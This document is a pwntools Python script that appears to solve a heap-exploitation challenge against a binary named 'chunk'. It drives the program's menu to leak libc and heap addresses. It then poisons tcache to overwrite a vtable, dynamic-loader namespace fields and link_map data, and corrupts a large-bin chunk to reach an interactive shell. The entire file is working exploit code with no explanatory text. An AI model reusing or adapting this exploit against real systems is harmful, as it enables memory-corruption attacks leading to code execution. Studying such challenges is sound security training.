#coding=utf8
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
local = 1
elf = ELF('./chunk')
if local:
    p = process('./chunk')
    libc = elf.libc
else:
    p = remote('172.16.229.161',7001)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))
def bk(addr):
    gdb.attach(p,"b *"+str(hex(addr)))

def malloc(index,size):
    ru("Your choice: ")
    sl('1')
    ru("Give me a book ID: ")
    sl(str(index))
    ru("how long: ")
    sl(str(size))
def free(index):
    ru("Your choice: ")
    sl('3')
    ru("Which one to throw?")
    sl(str(index))
def show(index):
    ru("Your choice: ")
    sl('2')
    ru("Which book do you want to show?")
    sl(str(index))
def edit(index,size,content):
	ru("Your choice: ")
	sl('4')
	ru("Which book to write?")
	sl(str(index))
	ru('how big?')
	sl(str(size))
	ru("Content: ")
	sl(content)
def overlap(index,addr,value):
	free(index)
	edit(index,0x20,p64(addr))
	malloc(index,index*0x10)
	malloc(index,index*0x10)
	edit(index,0x20,p64(value))

malloc(0,0x420)
malloc(1,0x20)
malloc(2,0x420)
malloc(3,0x30)
malloc(4,0x40)
malloc(5,0x50)
malloc(6,0x60)
malloc(7,0x70)
malloc(8,0x440)
malloc(18,0x20)
malloc(9,0x440)
malloc(10,0x100)
malloc(11,0x20)
free(0)
show(0)
ru("Content: ")
libc_base = u64(rc(6).ljust(8,'\x00'))-0x1e4ca0
print "libc_base-->"+hex(libc_base)
free(2)
show(2)
ru("Content: ")
heap = u64(rc(3).ljust(8,'\x00'))
print "heap-->"+hex(heap)
link_map = libc_base + 0x21e190
add_rsi = libc_base + 0x106ef8
vtable = 0x7ffff7fc5758
dl_nns = 0x7ffff7ffd960
ns0_load = 0x7ffff7ffd060
ns1_load = 0x7ffff7ffd0f0
# l_ns = 0x7ffff7ffe1c0
l_ns = 0x7ffff7fcb030
l_addr = 0x7ffff7ffe190
malloc(0,0x420)
malloc(2,0x420)
free(1)
edit(1,0x20,p64(vtable))
malloc(1,1*0x20)
malloc(1,1*0x20)
edit(1,0x20,p64(heap))
edit(0,0x100,'a'*0x28+p64(add_rsi))
overlap(3,dl_nns,heap)
overlap(4,ns0_load,0)
overlap(5,ns1_load,link_map)
overlap(6,l_ns,1)
free(8)
malloc(11,0x500)
edit(7,0x80,'a'*0x70+p64(0)+p64(0x455)[:7])
free(9)
# debug(0x7ffff7e59d40,0)
# pause()
malloc(20,100)
p.interactive()
#0x7ffff7f3d616